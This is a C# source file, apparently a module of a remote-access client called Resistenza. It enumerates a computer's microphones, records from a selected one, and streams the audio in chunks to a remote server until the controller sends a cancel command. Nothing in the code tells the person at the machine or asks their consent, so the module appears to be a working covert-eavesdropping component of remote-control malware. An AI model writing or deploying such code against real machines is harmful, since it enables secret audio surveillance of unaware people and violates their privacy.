using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using Resistenza.Common.Networking;
using Resistenza.Common.Packets;

using NAudio.Wave;
using NAudio.CoreAudioApi;
using NAudio.Codecs;
using Resistenza.Client.Logic;

namespace Resistenza.Common.Packets.Microphone
{
    public class MicBroadcast
    {
        public MicBroadcast(SecureStream Server, SemaphoreSlim Lock) {

            _ServerStrem = Server;
            _Lock = Lock;
        }

        private SecureStream _ServerStrem;
        private SemaphoreSlim _Lock;
        private readonly WaveFormat _Format = new WaveFormat(44100, 16, 2);



        public static List<MicrophoneDeviceInfo> GetDevicesInfo()
        {
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            List<MicrophoneDeviceInfo> DevicesInformation = new(); 
            foreach (MMDevice device in enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active))
            {
                MicrophoneDeviceInfo DeviceInfo = new();
                DeviceInfo.Name = device.FriendlyName;
                DeviceInfo.Id = device.ID;
                DevicesInformation.Add(DeviceInfo);
                
            }

            return DevicesInformation;
        }

        

        public async Task StartStreaming(string DeviceName, CancellationTokenSourceWithId CancelOperation)
        {
            
            WaveInEvent WaveIn = new WaveInEvent();

            int waveInDevices = WaveInEvent.DeviceCount;
            for (int waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++)
            {
                WaveInCapabilities deviceInfo = WaveInEvent.GetCapabilities(waveInDevice);
                if(deviceInfo.ProductName == DeviceName)
                {
                    WaveIn.DeviceNumber = waveInDevice;
                }
            }

            WaveIn.WaveFormat = _Format;
            WaveIn.DataAvailable += OnDataAvailable;
            WaveIn.StartRecording();

            ;

            while (!(CancelOperation.IsCancellationRequested && (CancelOperation.IdOfTaskToBeCancelled == TasksIds.STREAM_AUDIO_TASK_ID || CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS))) 
            {
                await Task.Delay(100);
                
            }

            WaveIn.StopRecording();
            WaveIn.Dispose();       
            CancelOperation.Token.ThrowIfCancellationRequested();
            
           

        }

        private async void OnDataAvailable(object? sender, WaveInEventArgs Args)
        {
            MicChunkResponse Chunk = new MicChunkResponse();
            Chunk.Data = Args.Buffer;

            await _Lock.WaitAsync();
            await _ServerStrem.SendPacketAsync(Chunk);
            _Lock.Release();

        }
    }

    public class MicrophoneDeviceInfo
    {
        public string Name { get; set; }
        public string Id { get; set; }
    }
}
